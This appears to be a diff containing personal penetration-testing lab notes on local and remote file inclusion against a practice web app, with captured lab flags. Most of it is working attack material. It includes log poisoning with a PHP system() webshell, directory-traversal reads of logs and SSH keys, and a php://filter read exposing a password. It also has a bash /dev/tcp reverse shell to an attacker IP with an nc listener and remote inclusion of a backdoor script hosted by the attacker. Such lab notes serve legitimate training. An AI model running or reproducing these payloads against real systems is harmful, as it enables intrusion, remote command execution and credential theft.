@@ -1,0 +1,112 @@
+Common web application attacks
+
+File inclusion vulnerabilities
+
+192.168.66.16
+
+/var/log/apache2/access.log
+
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+
+
+log poison:
+GET /meteor/index.php?page=admin.php HTTP/1.1
+Host: mountaindesserts.com
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+
+test ps cmd:
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
+
+test ls cmd:
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la HTTP/1.1
+
+
+bash -i >& /dev/tcp/192.168.49.66/4444 0>&1
+
+192.168.49.66
+
+listener:
+nc -nvlp 4444
+
+reverse shell:
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.66%2F4444%200%3E%261%22
+
+sudo cat /home/ariella/flag.txt
+
+OS{5cedbd052d450bef44895e22a10f57f7}
+
+----------
+
+http://mountaindesserts.com:8001/meteor/
+
+/opt/admin.bak.php
+
+curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php
+
+GET /meteor/index.php?page=../../../../../../../../../opt/admin.bak.php HTTP/1.1
+
+OS{0a59d0e540031866036e85e7610c5256}
+
+-----------
+
+ROT13 is a simple, reversible cipher (letter shift) for basic text obfuscation, while Base64 is a more robust encoding scheme that converts binary data into ASCII text, the key difference is ROT13 transforms letters within the alphabet (A→N), while Base64 represents binary data using 64 characters (A-Z, a-z, 0-9, +, /)
+
+php://filter wrapper 
+
+data:// wrapper
+
+192.168.66.16
+
+/var/www/html/backup.php
+
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7NjljODAzMDU0YWU1MjJlNDVlMmQyYTU5MTkzNjU4MjZ9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo=
+
+https://www.base64decode.org/
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>
+
+<?php
+
+system("sudo rsync -avzR /var/www/html/index.php /mnt/external/");
+// Since it is a PHP file visitors cannot see this comment. We need to extend this script that it backups the whole system but now as a PoC it only backups index.php
+//@All: When you run the backup script you need to enter the password OS{69c803054ae522e45e2d2a5919365826}.
+
+?>
+
+</body>
+</html>
+
+OS{69c803054ae522e45e2d2a5919365826}
+
+-----------
+
+PHP webshells in the /usr/share/webshells/php/ directory that can be used for RFI. A webshell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands
+
+/usr/share/webshells/php/simple-backdoor.php
+
+python3 -m http.server 80
+
+192.168.49.66
+
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.49.66/simple-backdoor.php&cmd=ls"
+
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.49.66/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"
+
+OS{274ce8a8ede5dc540b07e81359940c0b}
+
+
+'
+
+
+
